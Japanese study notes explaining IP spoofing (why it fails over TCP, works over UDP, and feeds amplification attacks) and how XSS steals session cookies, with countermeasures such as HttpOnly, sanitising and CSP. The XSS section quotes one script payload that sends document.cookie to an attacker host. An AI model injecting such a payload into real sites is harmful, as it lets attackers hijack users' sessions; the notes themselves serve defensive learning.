# 01 Network Security

## IP スプーフィング
IP スプーフィングとは、「送信元 IP アドレスを偽装したパケットを送る」ことを指す用語。　IP ヘッダの送信元 IP は送信側が自由に書けるフィールド（通常は自分のアドレスを書く）であるため、理論上はあらゆる IP として偽装したパケットを送信することが可能。

### では、通常成立するのか？
TCP では、3 ウェイハンドシェイクを行う場合に、SYN/ACK を返す必要がある。偽装 IP では、SYN/ACK が到達せず、ハンドシェイクが成立しないため、使えない。
一方で、UDP に関しては送りっぱなしでよいので簡単に成立する。

### 対策は？
ISP 上では、想定外の送信元がセットされた IP パケットは破棄される。

### 一方でまだ使える領域は？
同一ネットワーク内では、一見正しい通信に見えてしまうため、フィルタリングできない。ISP も介入しなければ、送信元を隣のサーバに偽装するようなイメージ。
DNS Amplification 攻撃や、リフレクション攻撃にはまだ使える。

## XSS
### XSS でセッション ID が盗まれるのはなぜ？
攻撃者が悪意のあるJavaScriptを注入
- 例：<script>fetch('https://attacker.com/?cookie='+document.cookie)</script>

JavaScript が Cookie にアクセス
- ブラウザ上で実行される JavaScript は、document.cookie で同じドメインの Cookie を読み取れる

攻撃者のサーバーに送信
- 盗んだセッション ID を攻撃者のサーバーに送信

セッションハイジャック
- 攻撃者が盗んだセッション ID を使って、被害者になりすましてログイン

### 対策は？
- HttpOnly 属性：CookieにHttpOnly属性を設定すると、JavaScriptからdocument.cookieでアクセスできなくなる
- XSS の前に止める：入力値のサニタイジング、エスケープ処理
- CSP（Content Security Policy）：実行可能なスクリプトを制限